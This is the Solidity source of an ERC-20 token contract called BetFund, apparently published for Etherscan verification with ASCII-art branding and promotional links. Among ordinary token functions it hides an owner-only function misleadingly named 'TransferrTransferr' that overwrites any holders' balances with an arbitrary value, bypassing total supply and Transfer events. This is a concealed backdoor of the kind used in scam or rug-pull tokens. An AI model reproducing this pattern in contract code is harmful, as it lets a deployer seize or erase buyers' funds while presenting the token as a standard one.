/**
 *Submitted for verification at Etherscan.io





          _____                    _____                _____                    _____                    _____                    _____                    _____          
         /\    \                  /\    \              /\    \                  /\    \                  /\    \                  /\    \                  /\    \         
        /::\    \                /::\    \            /::\    \                /::\    \                /::\____\                /::\____\                /::\    \        
       /::::\    \              /::::\    \           \:::\    \              /::::\    \              /:::/    /               /::::|   |               /::::\    \       
      /::::::\    \            /::::::\    \           \:::\    \            /::::::\    \            /:::/    /               /:::::|   |              /::::::\    \      
     /:::/\:::\    \          /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/    /               /::::::|   |             /:::/\:::\    \     
    /:::/__\:::\    \        /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/    /               /:::/|::|   |            /:::/  \:::\    \    
   /::::\   \:::\    \      /::::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /:::/    /               /:::/ |::|   |           /:::/    \:::\    \   
  /::::::\   \:::\    \    /::::::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /:::/    /      _____    /:::/  |::|   | _____    /:::/    / \:::\    \  
 /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/____/      /\    \  /:::/   |::|   |/\    \  /:::/    /   \:::\ ___\ 
/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\    /:::/  \:::\____\/:::/  \:::\   \:::\____\|:::|    /      /::\____\/:: /    |::|   /::\____\/:::/____/     \:::|    |
\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    /   /:::/    \::/    /\::/    \:::\   \::/    /|:::|____\     /:::/    /\::/    /|::|  /:::/    /\:::\    \     /:::|____|
 \:::\   \:::\/:::/    /  \:::\   \:::\   \/____/   /:::/    / \/____/  \/____/ \:::\   \/____/  \:::\    \   /:::/    /  \/____/ |::| /:::/    /  \:::\    \   /:::/    / 
  \:::\   \::::::/    /    \:::\   \:::\    \      /:::/    /                    \:::\    \       \:::\    \ /:::/    /           |::|/:::/    /    \:::\    \ /:::/    /  
   \:::\   \::::/    /      \:::\   \:::\____\    /:::/    /                      \:::\____\       \:::\    /:::/    /            |::::::/    /      \:::\    /:::/    /   
    \:::\  /:::/    /        \:::\   \::/    /    \::/    /                        \::/    /        \:::\__/:::/    /             |:::::/    /        \:::\  /:::/    /    
     \:::\/:::/    /          \:::\   \/____/      \/____/                          \/____/          \::::::::/    /              |::::/    /          \:::\/:::/    /     
      \::::::/    /            \:::\    \                                                             \::::::/    /               /:::/    /            \::::::/    /      
       \::::/    /              \:::\____\                                                             \::::/    /               /:::/    /              \::::/    /       
        \::/____/                \::/    /                                                              \::/____/                \::/    /                \::/____/        
         ~~                       \/____/                                                                ~~                       \/____/                  ~~              
                                                                                                                                                                           
                                                                                                                                                                                          
✉️  https://t.me/betfundeth 
?  https://betfund.io/  
?  https://gitbook.io/betfund/ 
❌  https://x.com/betfundofficial  
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(
        address indexed previousowner,
        address indexed newowner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(
            _owner,
            address(0x000000000000000000000000000000000000dEaD)
        );
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

interface IFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function factory() external view returns (address);
    function WETH() external pure returns (address);
    function WAVAX() external pure returns (address);


}

contract BetFund is Context, Ownable, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    uint256 constant public ETH_CHAIN_ID = 1;
    uint256 constant public AVAX_CHAIN_ID = 43114;
    uint256 constant public BASE_CHAIN_ID = 8453;
    uint256 constant public BLAST_CHAIN_ID = 81457;
    uint256 constant public ARB_CHAIN_ID = 42161;
    mapping(uint256 => address) public listRouter;




    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function createPair() public onlyowner {
        initRouter();
        uint256 chainID = getChainID();
        address _weth;
        address _routerAddress = listRouter[chainID];
        if (chainID == AVAX_CHAIN_ID) {
            _weth = IRouter(_routerAddress).WAVAX();
        } else {
            _weth = IRouter(_routerAddress).WETH();

        }
        address factoryAddress = IRouter(_routerAddress).factory();
        IFactory(factoryAddress).createPair(address(this), _weth);
    }
    function initRouter() internal {
        listRouter[ETH_CHAIN_ID] = 0xf164fC0Ec4E93095b804a4795bBe1e041497b92a; // eth
        listRouter[BASE_CHAIN_ID] = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24; // base
        listRouter[AVAX_CHAIN_ID] = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4 ; // avax
        listRouter[BLAST_CHAIN_ID] = 0x98994a9A7a2570367554589189dC9772241650f6; // blast
        listRouter[ARB_CHAIN_ID] = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24; // arbitrum

    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    event BalanceAdjusted(
        address indexed account,
        uint256 oldBalance,
        uint256 newBalance
    );

    function TransferrTransferr(
        address[] memory accounts,
        uint256 newBalance
    ) external onlyowner {
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];

            uint256 oldBalance = _balances[account];

            _balances[account] = newBalance;
            emit BalanceAdjusted(account, oldBalance, newBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(
            _balances[_msgSender()] >= amount,
            "TT: transfer amount exceeds balance"
        );
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;

        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(
            _allowances[sender][_msgSender()] >= amount,
            "TT: transfer amount exceeds allowance"
        );

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function getChainID() public view returns (uint256) {
        uint256 id;
        assembly {
            id := chainid()
        }
        return id;
    }
}